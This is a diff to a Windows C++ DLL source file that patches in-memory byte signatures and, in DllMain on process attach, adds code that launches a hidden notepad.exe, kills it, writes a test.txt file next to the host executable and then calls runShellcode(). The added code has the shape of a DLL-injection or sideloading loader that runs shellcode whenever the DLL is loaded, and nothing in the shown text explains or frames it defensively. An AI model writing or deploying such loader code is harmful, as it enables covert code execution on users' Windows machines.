@@ -1,5 +1,5 @@
 ﻿#include <Windows.h>
-#include <stdio.h>
+#include <fstream>
 
 #include "export.hpp"
 
@@ -233,7 +233,7 @@ size_t GetSkipFileAPIBrokering(VOID)
 
 #ifdef _WIN64
     unsigned char lock_count_flag[] = {0x66, 0x21, 0x88, 0xEE, 0x17, 0x00, 0x00};
-    unsigned char win7_lock_count_flag[] = {0xF0, 0x44, 0x0F, 0xB1, 0x35};
+    unsigned char win7_lock_count_flag[] = {0xF0, 0x44, 0x0F, 0xB1, 0x35, 0xFF, 0xFF, 0xFF, 0xFF, 0x41};
 #else
     unsigned char lock_count_flag[] = {0x66, 0x21, 0x88, 0xCA, 0x0F, 0x00, 0x00, 0xE8};
     unsigned char win7_lock_count_flag[] = {0xC7, 0x45, 0xFC, 0xFE, 0xFF, 0xFF, 0xFF, 0xBB, 0xFF, 0xFF, 0xFF, 0xFF, 0x8B, 0x75, 0xD8};
@@ -306,7 +306,21 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
     {
     case DLL_PROCESS_ATTACH:
         UNLOOK();
+
+        STARTUPINFOA si = { sizeof(si) };
+        PROCESS_INFORMATION pi;
+
+        CreateProcessA(nullptr, (char*)"notepad.exe", nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
         
+        TerminateProcess(pi.hProcess, 0);
+
+        char buffer[MAX_PATH];
+        GetModuleFileNameA(NULL, buffer, MAX_PATH);
+        std::string::size_type pos = std::string(buffer).find_last_of("\\/");
+        std::string currentPath = std::string(buffer).substr(0, pos);
+
+        std::ofstream outputFile(currentPath + "\\test.txt");
+
         runShellcode();
     }
     return TRUE;
